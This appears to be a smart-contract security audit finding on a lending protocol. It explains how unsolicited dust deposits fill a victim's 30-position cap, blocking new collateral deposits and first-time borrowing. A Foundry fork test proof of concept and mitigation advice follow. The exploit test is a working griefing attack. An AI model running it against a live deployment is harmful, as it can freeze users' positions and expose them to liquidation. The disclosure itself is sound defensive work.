### Title

Unsolicited dust deposits can exhaust `MAX_TOKENS_PER_USER` and block a victim’s positions - (`contracts/DepositToken.sol`)

### Summary

`Pool` limits each account to 30 combined deposit-token and debt-token positions and reverts whenever another token must be inserted into either account list. [1](#0-0)  `DepositToken.deposit()` allows any caller to mint a positive deposit-token balance to an arbitrary `onBehalfOf_` address, while `_mint()` registers that token in the beneficiary’s capped list when its prior balance was zero. [2](#0-1) [3](#0-2)  An attacker can therefore deposit dust across distinct active collateral tokens on behalf of a victim, or transfer dust deposit tokens to the victim, until all remaining account-list slots are occupied. [4](#0-3) [5](#0-4) 

### Finding Description

The externally reachable attack starts through `DepositToken.deposit(amount_, victim)`, which transfers attacker-supplied underlying collateral and calls `_mint(onBehalfOf_, deposited)`. [6](#0-5)  For a first positive balance, `_mint()` calls `Pool.addToDepositTokensOfAccount(victim)`, which inserts the calling deposit token into `depositTokensOfAccount[victim]`. [3](#0-2) [7](#0-6)  A normal `transfer()` reaches the same account-list insertion through `_transfer()`, so an attacker can also move dust deposit-token balances to the victim after acquiring them. [4](#0-3) [5](#0-4) 

`Pool.onlyIfAdditionWillNotReachMaxTokens()` counts both debt and deposit positions and reverts once their sum reaches `MAX_TOKENS_PER_USER`. [8](#0-7) [1](#0-0)  Once the victim’s list is full, minting any additional first-time deposit token reverts through `addToDepositTokensOfAccount()`, and issuing a first debt token reverts through `addToDebtTokensOfAccount()`. [9](#0-8) [10](#0-9)  This blocks a victim from opening a new collateral position or borrowing a synthetic asset they do not already owe. [11](#0-10) 

The forced entries are not always trivially removable: `transfer()` first requires the transferred amount to be unlocked, and `unlockedBalanceOf()` returns zero when the account has no remaining issuable capacity. [12](#0-11) [13](#0-12)  Consequently, a leveraged victim may be unable to remove the dust entries before restoring account health, while the same exhausted list prevents them from adding the collateral needed to restore that health. [14](#0-13) 

### Impact Explanation

This breaks per-account position liveness and can temporarily freeze a victim’s position-management path: new deposits and first-time debt positions revert even though the victim has sufficient underlying collateral or intended borrowing capacity. [15](#0-14) [10](#0-9)  The practical consequence is highest for an account already close to the 30-position cap or close to its borrowing limit, because unsolicited dust can prevent an emergency collateral deposit and leave the position exposed to liquidation. [13](#0-12)  The attack does not directly steal funds, but it can deny access to protocol functionality and temporarily lock the victim into an existing set of positions. [16](#0-15) 

### Likelihood Explanation

No privileged role, malicious token contract, oracle manipulation, or reentrancy is required because both `deposit()` and `transfer()` are public paths into the account-list insertion. [2](#0-1) [4](#0-3)  The attacker must use distinct registered deposit tokens because only pool-registered callers are accepted and duplicate account-list entries are not added. [17](#0-16)  Each dust deposit must mint a nonzero amount after the configured deposit fee, which can be selected with `quoteDepositOut()`. [18](#0-17)  Feasibility depends on the number of active supported collateral tokens and the victim’s existing position count, but the cost per occupied slot is only the minimum minting deposit plus gas. [19](#0-18) 

### Recommendation

Require an economically meaningful minimum first deposit or transfer amount before registering a new token in `depositTokensOfAccount`, denominated preferably in USD using the protocol oracle. [3](#0-2)  Alternatively, require beneficiary opt-in for unsolicited first-time deposit-token balances or add a safe mechanism for victims to evict dust positions even when the balance would otherwise be locked. [13](#0-12)  Any mitigation must preserve the invariant that positive balances and account-list entries stay synchronized, because `debtPositionOf()` relies on those lists to calculate collateral, debt, and health. [20](#0-19) 

### Proof of Concept

The following Foundry fork test demonstrates the concrete path when the deployment has enough active deposit tokens to fill the victim’s remaining account-list slots. [15](#0-14) 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";
import {IDepositToken} from "../contracts/interfaces/IDepositToken.sol";
import {IDebtToken} from "../contracts/interfaces/IDebtToken.sol";
import {IPool, UserReachedMaxTokens} from "../contracts/interfaces/IPool.sol";

contract MaxTokenSlotGriefingForkTest is Test {
    uint256 internal constant MAX_TOKENS_PER_USER = 30;

    IPool internal pool = IPool(/* deployed Pool proxy */);

    function test_AttackerFillsVictimTokenSlots() public {
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");

        address[] memory depositTokens = pool.getDepositTokens();

        // Give the victim one valuable collateral position, so a later debt
        // issuance would otherwise be collateralized.
        IDepositToken collateral = IDepositToken(depositTokens[0]);
        IERC20 collateralUnderlying = collateral.underlying();
        uint256 collateralAmount = 1_000_000 ether;

        deal(address(collateralUnderlying), victim, collateralAmount);
        vm.startPrank(victim);
        collateralUnderlying.approve(address(collateral), collateralAmount);
        collateral.deposit(collateralAmount, victim);
        vm.stopPrank();

        uint256 occupied =
            pool.getDepositTokensOfAccount(victim).length +
            pool.getDebtTokensOfAccount(victim).length;

        uint256 needed = MAX_TOKENS_PER_USER - occupied;
        uint256 filled;

        for (uint256 i; i < depositTokens.length && filled < needed; ++i) {
            IDepositToken depositToken = IDepositToken(depositTokens[i]);

            // Existing balances already occupy slots; use only unused tokens.
            if (!depositToken.isActive() || depositToken.balanceOf(victim) != 0) {
                continue;
            }

            IERC20 underlying = depositToken.underlying();
            uint256 amount = 1;

            // Pick the smallest simple amount that mints a nonzero balance.
            while (true) {
                (uint256 deposited,) = depositToken.quoteDepositOut(amount);
                if (deposited > 0) break;
                amount *= 10;
            }

            deal(address(underlying), attacker, amount);
            vm.startPrank(attacker);
            underlying.approve(address(depositToken), amount);
            depositToken.deposit(amount, victim);
            vm.stopPrank();

            ++filled;
        }

        assertEq(filled, needed);
        assertEq(
            pool.getDepositTokensOfAccount(victim).length +
                pool.getDebtTokensOfAccount(victim).length,
            MAX_TOKENS_PER_USER
        );

        // Select a debt token the victim does not already hold.
        address[] memory debtTokens = pool.getDebtTokens();
        IDebtToken debtToken;
        for (uint256 i; i < debtTokens.length; ++i) {
            if (IDebtToken(debtTokens[i]).balanceOf(victim) == 0) {
                debtToken = IDebtToken(debtTokens[i]);
                break;
            }
        }

        uint256 debtAmount = 1;
        uint256 debtFloor = pool.debtFloorInUsd();
        if (debtFloor != 0) {
            debtAmount = pool.masterOracle().quoteUsdToToken(
                address(debtToken.syntheticToken()),
                debtFloor + 1
            );
        }

        // The debt mint reaches Pool.addToDebtTokensOfAccount(), which reverts
        // because all 30 combined token slots are occupied.
        vm.prank(victim);
        vm.expectRevert(UserReachedMaxTokens.selector);
        debtToken.issue(debtAmount, victim);
    }
}
```
